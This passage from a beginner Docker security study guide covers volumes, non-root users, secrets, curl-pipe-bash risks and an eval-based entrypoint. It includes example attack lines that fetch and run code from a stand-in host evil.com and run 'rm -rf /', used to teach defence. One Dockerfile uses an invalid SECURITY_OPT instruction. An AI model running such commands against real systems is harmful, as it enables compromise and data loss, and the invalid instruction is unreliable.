**Explanation for Beginners:**

**Ownership with Volumes:**

**Bind Mounts:**
- Use host filesystem permissions
- COPY --chown in Dockerfile doesn't affect bind mounts
- Need to fix permissions at runtime or on host

**Named Volumes:**
- First container initializes volume
- Ownership from COPY --chown is preserved
- Subsequent containers use existing volume

**Example:**

**Bind Mount:**
```bash
# Host directory owned by user (UID 1001)
ls -la /host/data
# drwxr-xr-x 1001 1001

docker run -v /host/data:/data myapp
# /data in container has UID 1001 (from host)
# Even if Dockerfile said --chown=1000:1000
```

**Named Volume:**
```bash
docker run -v appdata:/data myapp
# First run: initializes volume with files from image
# Ownership from COPY --chown preserved
# Subsequent runs: uses existing volume
```

**Handling Permission Issues:**

**Option 1: Fix at runtime:**
```dockerfile
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/bin/sh
chown -R appuser:appuser /data
exec su-exec appuser "$@"
```

**Option 2: Match UIDs:**
```bash
# Build with your UID
docker build --build-arg UID=$(id -u) --build-arg GID=$(id -g) -t myapp .
```

**Option 3: Use user namespace remapping (Docker daemon config):**
```json
{
  "userns-remap": "default"
}
```

---

### Question 69
**Dockerfile:**
```dockerfile
FROM postgres:14
COPY init.sql /docker-entrypoint-initdb.d/
VOLUME /var/lib/postgresql/data
```

**Commands:**
```bash
docker run --name pg1 -e POSTGRES_PASSWORD=pass1 postgres-custom
docker stop pg1
docker run --name pg2 -e POSTGRES_PASSWORD=pass2 postgres-custom
```

**Tasks:**
a. What happens to data between containers?  
b. Why might pg2 still have pg1's data?

**Solution:**

**a. What Happens:**

1. **Answer:** pg1 and pg2 get DIFFERENT anonymous volumes
2. **Answer:** Each container has its own isolated data
3. **But:** If you used named volumes, they would share data

**With Anonymous Volumes:**
```
pg1 → volume_abc123 (pg1's data)
pg2 → volume_def456 (pg2's data, fresh database)
```

**b. Why pg2 Might Have pg1's Data:**

**If you used named volume:**
```bash
docker run --name pg1 -v pgdata:/var/lib/postgresql/data -e POSTGRES_PASSWORD=pass1 postgres-custom
docker stop pg1
docker run --name pg2 -v pgdata:/var/lib/postgresql/data -e POSTGRES_PASSWORD=pass2 postgres-custom
# pg2 uses same volume! Has pg1's data!
# POSTGRES_PASSWORD for pg2 ignored (database already initialized)
```

**Corrected Understanding:**

**Separate data (anonymous volumes - default):**
```bash
docker run --name pg1 -e POSTGRES_PASSWORD=pass1 postgres-custom
# Volume: 234abc (pg1's data)

docker run --name pg2 -e POSTGRES_PASSWORD=pass2 postgres-custom
# Volume: 567def (pg2's data - fresh)
```

**Shared data (named volume):**
```bash
docker volume create pgdata

docker run --name pg1 -v pgdata:/var/lib/postgresql/data -e POSTGRES_PASSWORD=pass1 postgres-custom
# Initializes pgdata volume

docker stop pg1
docker rm pg1

docker run --name pg2 -v pgdata:/var/lib/postgresql/data -e POSTGRES_PASSWORD=pass2 postgres-custom
# Uses existing pgdata volume
# Already initialized - password change ignored!
```

**Explanation for Beginners:**

**Volume Persistence:**

**Anonymous Volumes:**
- Each container gets its own volume
- Volume persists after container stops
- Removed only when container is rm'd with -v flag
- Hard to identify which volume belongs to which container

**Named Volumes:**
- Explicitly named by user
- Can be shared across containers
- Persists independently of containers
- Easy to identify and manage

**PostgreSQL Initialization:**
- Runs init scripts only on FIRST startup
- Checks if data directory is empty
- If data exists, skips initialization
- Password can't be changed after initialization (security feature)

**Best Practices:**

**For persistent database:**
```bash
docker volume create pgdata
docker run -d \
  --name postgres \
  -v pgdata:/var/lib/postgresql/data \
  -e POSTGRES_PASSWORD=secret \
  postgres:14
```

**For fresh database each time:**
```bash
# Use anonymous volume
docker run --rm \
  --name postgres-temp \
  -e POSTGRES_PASSWORD=secret \
  postgres:14
# --rm removes container AND anonymous volumes
```

**For development:**
```bash
# Named volume you can inspect/backup
docker volume create pgdata-dev
docker run -d \
  --name postgres-dev \
  -v pgdata-dev:/var/lib/postgresql/data \
  -e POSTGRES_PASSWORD=dev \
  -p 5432:5432 \
  postgres:14
```

---

### Question 70
**Dockerfile:**
```dockerfile
FROM nginx
VOLUME /var/cache/nginx
COPY html/ /usr/share/nginx/html/
```

**Commands:**
```bash
docker run -d --name web1 myapp
docker run -d --name web2 -v web1-volumes:/var/cache/nginx myapp
```

**Tasks:**
a. Does web2 share web1's cache?  
b. How to properly share volumes?

**Solution:**

**a. Does web2 Share web1's Cache?**

**No!** web2 does NOT share web1's cache.

**What Actually Happens:**
```
web1: Uses anonymous volume (random_name_123)
web2: Uses named volume "web1-volumes"
These are DIFFERENT volumes!
```

**b. Properly Sharing Volumes:**

**Option 1: Use named volume for both:**
```bash
docker volume create shared-cache

docker run -d --name web1 \
  -v shared-cache:/var/cache/nginx \
  myapp

docker run -d --name web2 \
  -v shared-cache:/var/cache/nginx \
  myapp
# Now both share the same cache!
```

**Option 2: Use --volumes-from:**
```bash
docker run -d --name web1 myapp

docker run -d --name web2 \
  --volumes-from web1 \
  myapp
# web2 uses ALL volumes from web1
```

**Option 3: Docker Compose:**
```yaml
version: '3.8'
services:
  web1:
    image: myapp
    volumes:
      - shared-cache:/var/cache/nginx
  
  web2:
    image: myapp
    volumes:
      - shared-cache:/var/cache/nginx

volumes:
  shared-cache:
```

**Explanation for Beginners:**

**Sharing Volumes Between Containers:**

**Method 1: Named Volume (explicit):**
```bash
docker volume create cache
docker run -v cache:/cache app1
docker run -v cache:/cache app2
# Both use same "cache" volume
```

**Method 2: --volumes-from:**
```bash
docker run --name app1 -v data:/data app
docker run --volumes-from app1 app2
# app2 inherits ALL volumes from app1
```

**Method 3: Docker Compose:**
```yaml
services:
  app1:
    volumes:
      - shared:/data
  app2:
    volumes:
      - shared:/data
volumes:
  shared:
```

**Common Mistake:**
```bash
# Wrong: Different volumes!
docker run --name app1 myapp  # Creates anonymous volume A
docker run --name app2 myapp  # Creates anonymous volume B
# A ≠ B (not shared)

# Correct: Same named volume
docker run --name app1 -v mydata:/data myapp
docker run --name app2 -v mydata:/data myapp
# Both use "mydata"
```

**Use Cases for Shared Volumes:**
- Shared cache
- Shared configuration
- Inter-process communication
- Data exchange between containers

**Warning:**
- Concurrent writes may need locking
- Consider data corruption with databases
- PostgreSQL/MySQL should NOT share data volumes
- Okay for read-only or cache scenarios

---

## Questions 71-80: Security and Best Practices

### Question 71
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y python3
COPY . /app
WORKDIR /app
CMD ["python3", "app.py"]
```

**Tasks:**
a. What security concerns exist?  
b. Improve security

**Solution:**

**a. Security Concerns:**

1. **Issue:** Running as root user (UID 0)
2. **Issue:** If app compromised, attacker has root access
3. **Issue:** No user isolation
4. **Issue:** Violates principle of least privilege

**b. Secured Dockerfile:**

**Option 1: Basic non-root user:**
```dockerfile
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y python3 && \
    rm -rf /var/lib/apt/lists/*

# Create non-root user
RUN useradd -m -u 1000 appuser

WORKDIR /app

COPY --chown=appuser:appuser . .

USER appuser

CMD ["python3", "app.py"]
```

**Option 2: Complete security:**
```dockerfile
FROM python:3.9-slim

# Create non-root user
RUN groupadd -r -g 1000 appuser && \
    useradd -r -u 1000 -g appuser -m -s /sbin/nologin appuser

WORKDIR /app

# Install dependencies as root
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY --chown=appuser:appuser . .

# Remove unnecessary packages
RUN apt-get autoremove -y && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Switch to non-root user
USER appuser

# Drop capabilities (if supported)
SECURITY_OPT --cap-drop=ALL

EXPOSE 8000

HEALTHCHECK --interval=30s CMD python -c "import requests; requests.get('http://localhost:8000/health')"

CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:app"]
```

**Run with additional security:**
```bash
docker run -d \
  --name myapp \
  --read-only \
  --tmpfs /tmp \
  --security-opt=no-new-privileges:true \
  --cap-drop=ALL \
  -p 8000:8000 \
  myapp
```

**Explanation for Beginners:**

**Why Run as Non-Root:**
1. **Containment:** If app compromised, attacker has limited permissions
2. **Best practice:** Principle of least privilege
3. **Security:** Reduces attack surface
4. **Required:** Some environments (Kubernetes) enforce non-root

**Creating Users:**

**Ubuntu/Debian:**
```dockerfile
RUN useradd -m -u 1000 appuser
USER appuser
```

**Alpine:**
```dockerfile
RUN adduser -D -u 1000 appuser
USER appuser
```

**Security Flags:**
```bash
--read-only              # Filesystem read-only
--tmpfs /tmp             # Writable tmp
--security-opt=no-new-privileges  # Prevent privilege escalation
--cap-drop=ALL           # Drop all capabilities
--cap-add=NET_BIND_SERVICE  # Add only what's needed
```

---

### Question 72
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
RUN chmod 777 -R /app
CMD ["npm", "start"]
```

**Tasks:**
a. What's dangerous about chmod 777?  
b. Fix the permissions

**Solution:**

**a. Dangers:**

1. **Security Risk:** chmod 777 gives read/write/execute to everyone
2. **Issue:** Any user or process can modify application files
3. **Issue:** Malicious code could overwrite application
4. **Issue:** Violates security best practices

**chmod 777 means:**
```
7 = rwx (read, write, execute) for owner
7 = rwx for group
7 = rwx for everyone

Everyone can do everything!
```

**b. Fixed Dockerfile:**

**Option 1: Appropriate permissions:**
```dockerfile
FROM node:14-alpine

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy application
COPY . .

# Set reasonable permissions
# 755 for directories (rwxr-xr-x)
# 644 for files (rw-r--r--)
RUN find /app -type d -exec chmod 755 {} \; && \
    find /app -type f -exec chmod 644 {} \; && \
    chmod +x scripts/*.sh

# Create non-root user
RUN adduser -D -u 1000 appuser && \
    chown -R appuser:appuser /app

USER appuser

CMD ["npm", "start"]
```

**Option 2: Use COPY --chown:**
```dockerfile
FROM node:14-alpine

RUN adduser -D appuser

WORKDIR /app

COPY --chown=appuser:appuser package*.json ./
RUN npm ci

COPY --chown=appuser:appuser . .

USER appuser

CMD ["npm", "start"]
```

**Explanation for Beginners:**

**Permission Octal Notation:**
```
chmod 755 file
  7 = 4+2+1 = rwx (owner)
  5 = 4+0+1 = r-x (group)
  5 = 4+0+1 = r-x (others)

chmod 644 file
  6 = 4+2+0 = rw- (owner)
  4 = 4+0+0 = r-- (group)
  4 = 4+0+0 = r-- (others)

chmod 777 file (DANGEROUS!)
  7 = 4+2+1 = rwx (owner)
  7 = 4+2+1 = rwx (group)
  7 = 4+2+1 = rwx (others - anyone!)
```

**Appropriate Permissions:**

**Directories:**
- 755 (rwxr-xr-x): Owner can modify, others can read/execute
- 750 (rwxr-x---): Owner can modify, group can read, others nothing

**Regular Files:**
- 644 (rw-r--r--): Owner can modify, others can read
- 640 (rw-r-----): Owner can modify, group can read, others nothing

**Executables:**
- 755 (rwxr-xr-x): Owner can modify/execute, others can read/execute
- 750 (rwxr-x---): Owner can modify/execute, group can execute

**Security Best Practices:**
1. **Never use 777** unless absolutely necessary
2. **Use least privilege** - only permissions needed
3. **Run as non-root** user
4. **Set ownership** appropriately
5. **Read-only filesystem** when possible

**Example:**
```dockerfile
FROM python:3.9-slim

# Create user
RUN useradd -m -u 1000 appuser

WORKDIR /app

# Copy with correct ownership
COPY --chown=appuser:appuser . .

# Set permissions
RUN chmod 755 /app && \
    chmod 644 /app/*.py && \
    chmod +x /app/scripts/*.sh

USER appuser

CMD ["python", "app.py"]
```

---

### Question 73
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    vim \
    git \
    build-essential \
    python3 \
    nodejs \
    npm
COPY . /app
CMD ["python3", "/app/app.py"]
```

**Tasks:**
a. What's problematic about this image?  
b. Apply minimization principles

**Solution:**

**a. Problems:**

1. **Issue:** Installing way more than needed
2. **Issue:** Bloated image (unnecessary tools)
3. **Issue:** Large attack surface
4. **Issue:** Longer build times
5. **Issue:** Security risk (more tools = more vulnerabilities)

**What's Wrong:**
```
App needs: python3
Image includes: curl, wget, vim, git, build-essential, nodejs, npm
Why? These aren't needed to run the app!
Result: Bloated, insecure image
```

**b. Minimized Dockerfile:**

**Option 1: Install only what's needed:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install only runtime dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY . .

# Create non-root user
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app

USER appuser

CMD ["python", "app.py"]
```

**Option 2: Multi-stage (build vs runtime):**
```dockerfile
# Build stage
FROM ubuntu:20.04 AS build

RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY requirements.txt .
RUN pip3 install --user -r requirements.txt

# Runtime stage
FROM python:3.9-slim

WORKDIR /app

# Copy only Python packages
COPY --from=build /root/.local /root/.local
COPY . .

# Make sure scripts in .local are usable
ENV PATH=/root/.local/bin:$PATH

# Non-root user
RUN useradd -m appuser && \
    cp -r /root/.local /home/appuser/.local && \
    chown -R appuser:appuser /home/appuser/.local /app

USER appuser
ENV PATH=/home/appuser/.local/bin:$PATH

CMD ["python", "app.py"]
```

**Option 3: Use specific base image:**
```dockerfile
FROM python:3.9-slim

# Only install what runtime needs (if any)
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    libpq5 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["python", "app.py"]
```

**Explanation for Beginners:**

**Image Minimization Principles:**

**1. Use specific base images:**
```dockerfile
# Bad: Generic OS
FROM ubuntu
RUN apt-get install python3

# Good: Language-specific
FROM python:3.9-slim
```

**2. Install only runtime dependencies:**
```dockerfile
# Build stage needs build tools
FROM ubuntu AS build
RUN apt-get install build-essential

# Runtime stage needs only runtime libs
FROM ubuntu AS runtime
RUN apt-get install libpq5
```

**3. Clean up package managers:**
```dockerfile
RUN apt-get update && apt-get install -y package && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
```

**4. Remove build dependencies:**
```dockerfile
RUN apt-get install -y --no-install-recommends \
    gcc \
    && pip install package \
    && apt-get purge -y gcc \
    && apt-get autoremove -y
```

**Common Unnecessary Tools:**

**Development tools (don't need in production):**
- vim, nano, emacs (editors)
- git (version control)
- curl, wget (if app doesn't use them)
- build-essential, gcc (compilers)
- man pages, documentation

**Example - Before:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y \
    vim curl wget git \
    python3 python3-pip \
    build-essential
# Image size: 800MB
```

**Example - After:**
```dockerfile
FROM python:3.9-slim
# Image size: 150MB
# Already has Python, no unnecessary tools
```

**Security Benefits:**
- Fewer packages = fewer vulnerabilities
- Smaller attack surface
- Less chance of having exploitable tools
- Faster security patching

**Compare Image Sizes:**
```bash
# Bloated
FROM ubuntu:20.04 + many packages = 500-800MB

# Minimal
FROM python:3.9-slim = 150MB
FROM python:3.9-alpine = 50MB
FROM python:3.9-slim (multi-stage) = 100MB
```

---

### Question 74
**Dockerfile:**
```dockerfile
FROM node:14
COPY . /app
WORKDIR /app
RUN npm install
RUN npm audit fix
EXPOSE 3000
CMD ["npm", "start"]
```

**Tasks:**
a. What's problematic about npm audit fix in Dockerfile?  
b. Better approach for handling vulnerabilities

**Solution:**

**a. Problems:**

1. **Issue:** npm audit fix might modify package-lock.json
2. **Issue:** Build becomes non-deterministic
3. **Issue:** Might upgrade to incompatible versions
4. **Issue:** Can break application unexpectedly
5. **Issue:** Should audit BEFORE building, not during

**What Can Go Wrong:**
```
npm audit fix runs
→ Updates dependencies to fix vulnerabilities
→ May introduce breaking changes
→ App crashes or behaves differently
→ No way to track what changed
→ Different builds produce different results!
```

**b. Better Approaches:**

**Option 1: Audit in CI/CD, fix in development:**
```dockerfile
FROM node:14-alpine

WORKDIR /app

# Use locked dependencies
COPY package*.json ./
RUN npm ci  # Uses exact versions from package-lock.json
# Don't run npm audit fix!

COPY . .

EXPOSE 3000

CMD ["npm", "start"]
```

**In CI/CD:**
```yaml
# .github/workflows/audit.yml
name: Security Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm audit
      - run: npm audit --audit-level=high
```

**Option 2: Check audit but don't auto-fix:**
```dockerfile
FROM node:14-alpine AS audit

WORKDIR /app

COPY package*.json ./

# Audit check (fails build if critical vulnerabilities)
RUN npm audit --audit-level=critical

# Install dependencies
RUN npm ci

FROM node:14-alpine

WORKDIR /app

COPY --from=audit /app/node_modules ./node_modules
COPY . .

EXPOSE 3000

CMD ["npm", "start"]
```

**Option 3: Use npm ci with specific versions:**
```dockerfile
FROM node:14-alpine

WORKDIR /app

# package-lock.json ensures reproducible builds
COPY package.json package-lock.json ./

# npm ci: Clean install from lock file
RUN npm ci --only=production

COPY . .

# Non-root user
RUN adduser -D appuser && chown -R appuser:appuser /app
USER appuser

CMD ["node", "server.js"]
```

**Explanation for Beginners:**

**npm ci vs npm install:**

**npm install:**
- Updates package-lock.json
- Might install different versions
- Non-deterministic builds
- Good for development

**npm ci:**
- Uses exact versions from package-lock.json
- Reproducible builds
- Faster
- Good for production

**Handling Vulnerabilities:**

**1. Development (local):**
```bash
npm audit                  # Check for vulnerabilities
npm audit fix              # Auto-fix (updates package-lock.json)
git commit package-lock.json  # Commit changes
```

**2. CI/CD (automated):**
```yaml
- run: npm audit --audit-level=high
  # Fails if high/critical vulnerabilities found
```

**3. Production (Docker):**
```dockerfile
# Use fixed versions from package-lock.json
RUN npm ci --only=production
# Deterministic builds
```

**Security Best Practices:**
1. **Fix vulnerabilities BEFORE building image**
2. **Use npm ci for reproducible builds**
3. **Pin dependency versions**
4. **Scan images with tools** (Snyk, Trivy, Clair)
5. **Update base images** regularly
6. **Audit in CI/CD** pipeline
7. **Don't auto-fix in Dockerfile**

---

### Question 75
**Dockerfile:**
```dockerfile
FROM python:3.9
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
CMD ["python", "app.py"]
```

**.env file in project:**
```
DATABASE_PASSWORD=supersecret123
API_KEY=sk-1234567890abcdef
AWS_SECRET_KEY=ABCDEFGHIJK1234567890
```

**Tasks:**
a. What's the security problem?  
b. How to handle secrets properly?

**Solution:**

**a. Security Problems:**

1. **Critical:** .env file copied into image
2. **Critical:** Secrets visible in image layers
3. **Critical:** Anyone with image can extract secrets
4. **Critical:** Secrets baked into image permanently

**Checking secret exposure:**
```bash
docker run --rm myapp cat /app/.env
# Secrets visible!

docker save myapp > myapp.tar
tar -xf myapp.tar
# Can find .env in layers!
```

**b. Proper Secret Handling:**

**Option 1: Use .dockerignore:**

**.dockerignore:**
```
.env
.env.local
.env.*.local
*.key
*.pem
secrets/
```

**Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# .env excluded by .dockerignore
COPY . .

CMD ["python", "app.py"]
```

**Pass secrets at runtime:**
```bash
docker run -d \
  --env-file .env \
  myapp
```

**Option 2: Environment variables:**
```bash
docker run -d \
  -e DATABASE_PASSWORD=supersecret123 \
  -e API_KEY=sk-1234567890abcdef \
  myapp
```

**Option 3: Docker secrets (Swarm):**
```bash
echo "supersecret123" | docker secret create db_password -
docker service create \
  --secret db_password \
  myapp
```

**In application:**
```python
# Read from /run/secrets/db_password
with open('/run/secrets/db_password') as f:
    password = f.read().strip()
```

**Option 4: External secret manager:**
```bash
# AWS Secrets Manager
docker run -d \
  -e AWS_REGION=us-east-1 \
  -e SECRET_NAME=myapp/database \
  myapp
```

**Application retrieves secret from AWS:**
```python
import boto3
client = boto3.client('secretsmanager')
secret = client.get_secret_value(SecretId='myapp/database')
```

**Option 5: Build-time secrets (Docker BuildKit):**
```dockerfile
# syntax=docker/dockerfile:1
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

CMD ["python", "app.py"]
```

```bash
# Secret available during build, not in final image
docker build --secret id=env,src=.env -t myapp .
```

**Explanation for Beginners:**

**Never Put Secrets In:**
1. Dockerfile ENV variables
2. Files copied into image
3. Image layers
4. Git repositories

**Always:**
1. Use .dockerignore for secret files
2. Pass secrets at runtime
3. Use secret management systems
4. Rotate secrets regularly
5. Audit access to secrets

**Checking for exposed secrets:**
```bash
# Check image history
docker history myapp

# Check layers
docker save myapp -o myapp.tar
tar -xf myapp.tar

# Scan for secrets
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image myapp
```

**Best Practices:**
1. **.dockerignore all secret files**
2. **Use environment variables** at runtime
3. **Implement secret rotation**
4. **Use secret managers** (Vault, AWS Secrets)
5. **Audit and scan images**
6. **Never commit secrets to git**

---

### Question 76
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
RUN curl https://get-install-script.com/install.sh | bash
WORKDIR /app
COPY . .
CMD ["./app"]
```

**Tasks:**
a. What's dangerous about this?  
b. Provide safer alternatives

**Solution:**

**a. Dangers:**

1. **Critical:** Piping curl to bash (executing untrusted code)
2. **Risk:** Script could be compromised
3. **Risk:** No verification of script contents
4. **Risk:** Man-in-the-middle attacks
5. **Risk:** Supply chain attack vector

**What Could Go Wrong:**
```bash
curl https://evil.com/script.sh | bash
# Downloads and immediately executes whatever is returned
# Could:
# - Install malware
# - Steal secrets
# - Compromise container
# - Mine cryptocurrency
# - Exfiltrate data
```

**b. Safer Alternatives:**

**Option 1: Download, verify, then execute:**
```dockerfile
FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y curl ca-certificates && \
    # Download script
    curl -fsSL https://get-install-script.com/install.sh -o install.sh && \
    # Verify checksum
    echo "expected-sha256-hash install.sh" | sha256sum -c - && \
    # Inspect script (in real scenario, review it!)
    cat install.sh && \
    # Execute
    bash install.sh && \
    # Cleanup
    rm install.sh && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .
CMD ["./app"]
```

**Option 2: Use official packages:**
```dockerfile
FROM ubuntu:20.04

# Instead of curl | bash, use official packages
RUN apt-get update && \
    apt-get install -y \
    software-properties-common && \
    add-apt-repository ppa:official-repo && \
    apt-get update && \
    apt-get install -y the-package && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .
CMD ["./app"]
```

**Option 3: Use official Docker images:**
```dockerfile
# Instead of installing via script, use official image
FROM official-image:1.2.3

WORKDIR /app
COPY . .
CMD ["./app"]
```

**Option 4: Download with verification:**
```dockerfile
FROM ubuntu:20.04

ARG INSTALL_SCRIPT_URL=https://get-install-script.com/install.sh
ARG EXPECTED_SHA256=abc123...

RUN apt-get update && apt-get install -y curl && \
    # Download
    curl -fsSL ${INSTALL_SCRIPT_URL} -o install.sh && \
    # Verify checksum
    echo "${EXPECTED_SHA256}  install.sh" | sha256sum -c - && \
    # Review what it does (manually inspect during development)
    cat install.sh && \
    # Make it executable
    chmod +x install.sh && \
    # Execute
    ./install.sh && \
    # Cleanup
    rm install.sh && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .
CMD ["./app"]
```

**Explanation for Beginners:**

**Why "curl | bash" is Dangerous:**

**The Problem:**
```bash
curl https://site.com/script.sh | bash
# 1. Downloads script
# 2. Immediately executes without inspection
# 3. No verification
# 4. Complete trust in remote server
```

**What Could Happen:**
- Malicious code execution
- Backdoors installed
- Data exfiltration
- Cryptocurrency miners
- Container compromise

**Safe Alternatives:**

**1. Download, verify, inspect, execute:**
```bash
curl -O https://site.com/script.sh
sha256sum script.sh  # Verify hash
cat script.sh        # Inspect contents
bash script.sh       # Execute if safe
```

**2. Use official packages:**
```bash
apt-get install official-package
# or
pip install official-package
# or
npm install official-package
```

**3. Use official Docker images:**
```dockerfile
FROM official/image:version
# Maintained by trusted organization
```

**4. Copy script into image:**
```dockerfile
# Store verified script in your repo
COPY install.sh /tmp/
RUN chmod +x /tmp/install.sh && \
    /tmp/install.sh && \
    rm /tmp/install.sh
```

**Supply Chain Security:**
1. **Trust but verify**: Always verify checksums
2. **Use official sources**: Prefer official repos/images
3. **Pin versions**: Don't use :latest
4. **Review scripts**: Read before executing
5. **Scan images**: Use security scanners
6. **Minimal base images**: Less code = fewer vulnerabilities

---

### Question 77
**Dockerfile:**
```dockerfile
FROM alpine
RUN wget https://releases.example.com/app-latest.tar.gz
RUN tar -xzf app-latest.tar.gz
RUN rm app-latest.tar.gz
COPY config.json /app/
CMD ["/app/bin/app"]
```

**Tasks:**
a. What's problematic about downloading "latest"?  
b. Improve reproducibility

**Solution:**

**a. Problems:**

1. **Issue:** "latest" is not reproducible - changes over time
2. **Issue:** Builds today vs builds tomorrow may get different versions
3. **Issue:** Hard to debug issues (which version caused the problem?)
4. **Issue:** No version control
5. **Issue:** Can't rollback reliably

**What Happens:**
```
Build on Monday:
app-latest.tar.gz → version 1.5.0

Build on Wednesday:
app-latest.tar.gz → version 1.6.0 (has bug!)

Same Dockerfile, different results!
```

**b. Reproducible Dockerfile:**

**Option 1: Pin specific version:**
```dockerfile
FROM alpine:3.18

ARG APP_VERSION=1.5.0
ARG APP_SHA256=abc123def456...

RUN apk add --no-cache wget && \
    wget https://releases.example.com/app-${APP_VERSION}.tar.gz && \
    echo "${APP_SHA256}  app-${APP_VERSION}.tar.gz" | sha256sum -c - && \
    tar -xzf app-${APP_VERSION}.tar.gz -C /opt && \
    rm app-${APP_VERSION}.tar.gz && \
    apk del wget

COPY config.json /opt/app/

CMD ["/opt/app/bin/app"]
```

**Build specific version:**
```bash
docker build \
  --build-arg APP_VERSION=1.5.0 \
  --build-arg APP_SHA256=abc123... \
  -t myapp:1.5.0 \
  .
```

**Option 2: Use specific base image with app:**
```dockerfile
FROM myorg/app:1.5.0-alpine

COPY config.json /app/

CMD ["/app/bin/app"]
```

**Option 3: Multi-stage with verification:**
```dockerfile
FROM alpine:3.18 AS downloader

ARG APP_VERSION=1.5.0
ARG APP_URL=https://releases.example.com/app-${APP_VERSION}.tar.gz
ARG APP_SHA256

RUN apk add --no-cache wget && \
    wget ${APP_URL} -O app.tar.gz && \
    if [ -n "$APP_SHA256" ]; then \
      echo "${APP_SHA256}  app.tar.gz" | sha256sum -c -; \
    fi && \
    tar -xzf app.tar.gz -C /tmp

FROM alpine:3.18

COPY --from=downloader /tmp/app /opt/app
COPY config.json /opt/app/

# Non-root user
RUN adduser -D -u 1000 appuser && \
    chown -R appuser:appuser /opt/app

USER appuser

CMD ["/opt/app/bin/app"]
```

**Explanation for Beginners:**

**Reproducibility Principles:**

**Bad: Non-reproducible**
```dockerfile
FROM ubuntu:latest           # Changes over time
RUN curl latest-app | bash   # Changes over time
RUN apt-get install app      # Gets latest version
```

**Good: Reproducible**
```dockerfile
FROM ubuntu:20.04            # Specific version
ARG APP_VERSION=1.5.0        # Pinned version
RUN apt-get install app=1.5.0-1  # Specific version
```

**Why Reproducibility Matters:**
1. **Debugging:** Know exactly which versions caused issues
2. **Rollback:** Can rebuild old versions exactly
3. **Testing:** Test the same build that goes to production
4. **Compliance:** Audit trail of what's in production
5. **Reliability:** Same Dockerfile = same image, always

**Version Pinning:**

**Application versions:**
```dockerfile
ARG APP_VERSION=1.5.0
wget https://releases.com/app-${APP_VERSION}.tar.gz
```

**Package versions:**
```dockerfile
RUN apt-get install -y \
    nginx=1.18.0-0ubuntu1.4 \
    python3=3.8.2-0ubuntu2
```

**Python packages:**
```txt
# requirements.txt
flask==2.3.0
requests==2.31.0
sqlalchemy==2.0.20
# Not: flask>=2.0 or flask (gets latest)
```

**Node packages:**
```json
{
  "dependencies": {
    "express": "4.18.2",
    "mongoose": "7.4.0"
  }
}
// Use package-lock.json
```

**Verification:**

**1. Checksums:**
```dockerfile
RUN wget https://releases.com/app.tar.gz && \
    echo "abc123...  app.tar.gz" | sha256sum -c -
```

**2. GPG signatures:**
```dockerfile
RUN wget https://releases.com/app.tar.gz && \
    wget https://releases.com/app.tar.gz.sig && \
    gpg --verify app.tar.gz.sig app.tar.gz
```

**3. Version tags:**
```bash
docker build -t myapp:1.5.0 .
# Tag images with specific versions
```

**Best Practices:**
1. **Pin all versions** (base images, packages, applications)
2. **Verify checksums** for downloaded files
3. **Use lock files** (package-lock.json, requirements.txt with ==)
4. **Tag images** with specific versions
5. **Document versions** in Dockerfile comments
6. **Test upgrades** before deploying
7. **Keep audit trail** of version changes

---

### Question 78
**Dockerfile:**
```dockerfile
FROM ubuntu:latest
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
COPY . /app
ENTRYPOINT ["/entrypoint.sh"]
CMD ["python3", "/app/app.py"]
```

**entrypoint.sh:**
```bash
#!/bin/bash
eval "$@"
```

**Tasks:**
a. What's the security vulnerability?  
b. Fix the entrypoint

**Solution:**

**a. Security Vulnerability:**

1. **Critical:** `eval "$@"` executes ANY passed arguments
2. **Risk:** Command injection vulnerability
3. **Risk:** Attacker can execute arbitrary commands

**Attack Example:**
```bash
docker run myapp "rm -rf /"
# eval "$@" → eval "rm -rf /"
# Disaster!

docker run myapp "; curl evil.com/backdoor | bash"
# Command injection!
```

**b. Secure Entrypoint:**

**Option 1: Use exec without eval:**
```bash
#!/bin/bash
set -e

# Initialization logic here
echo "Starting application..."

# Execute command without eval
exec "$@"
```

**Option 2: Validate arguments:**
```bash
#!/bin/bash
set -e

# Only allow specific commands
case "$1" in
  "python3"|"gunicorn"|"flask")
    exec "$@"
    ;;
  *)
    echo "Error: Invalid command"
    exit 1
    ;;
esac
```

**Option 3: Don't use entrypoint for command execution:**
```bash
#!/bin/bash
set -e

# Do initialization
python3 manage.py migrate
python3 manage.py collectstatic --noinput

